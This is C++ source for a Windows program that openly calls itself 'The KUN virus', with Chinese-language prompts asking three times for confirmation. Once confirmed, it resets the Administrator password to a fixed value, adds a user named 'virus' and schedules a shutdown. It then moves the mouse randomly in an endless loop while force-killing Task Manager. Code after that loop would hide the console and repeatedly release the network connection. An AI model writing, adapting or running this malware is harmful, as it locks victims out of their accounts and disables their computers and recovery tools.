#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	system("title Tiwers OS ----The KUN virus [version:0.3.0]");
	system("color a");
	char da;
	cout<<"Tinwers OS ---- The KUN virus [version:0.3.0]"<<endl;
	cout<<"(c) SUNNY BLANK。保留所有权利。"<<endl<<endl;
	cout<<"请慎重使用本电脑病毒,严禁非法使用!"<<endl;
	cout<<"请慎重使用本电脑病毒,严禁非法使用!"<<endl;
	cout<<"请慎重使用本电脑病毒,严禁非法使用!"<<endl<<endl;
	cout<<"是否确定使用本电脑病毒？[T/F] ";
	cin>>da;
	if(da=='T'||da=='t'){
		cout<<"是否确定使用本电脑病毒?(再次确认) [T/F] ";
		cin>>da;
		if(da=='T'||da=='t'){
			cout<<"是否确定使用本电脑病毒?(最后确认) [T/F] ";
			cin>>da;
			if(da=='T'||da=='t'){
				cout<<"修改密码中。。。。。";
				char k='Y';
				if(k=='Y') system("net user Administrator n1y2b3g4j");//用户密码重设为n1y2b3g4j
				system("net user virus wait /add");//用户名重设为virus
				cout<<"30秒后关机。。。。。";
				k='Y';
				if(k=='Y') system("shutdown -s -t 30");//30秒后关机
				int x=GetSystemMetrics(SM_CXSCREEN);//get鼠标x轴
  				int y=GetSystemMetrics(SM_CYSCREEN);//get鼠标y轴
				cout<<"控制鼠标中。。。。。";
				k='Y';
				if(k=='Y') {
					while(1){
						SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
						system("taskkill /f /im taskmgr.exe");//禁止打开任务管理器（慎用）
					}	
				}
				HWND hwnd;
				hwnd = FindWindow("ConsoleWindowClass", NULL);
				if (hwnd){
					ShowWindow(hwnd, SW_HIDE);
				}
				MessageBox(NULL, "正在断开网络", "警告", MB_OK + MB_ICONWARNING);
				while (true){
					system("ipconfig /release"); //断开网络
				}
			} 
		}
	}
	
}

	
 
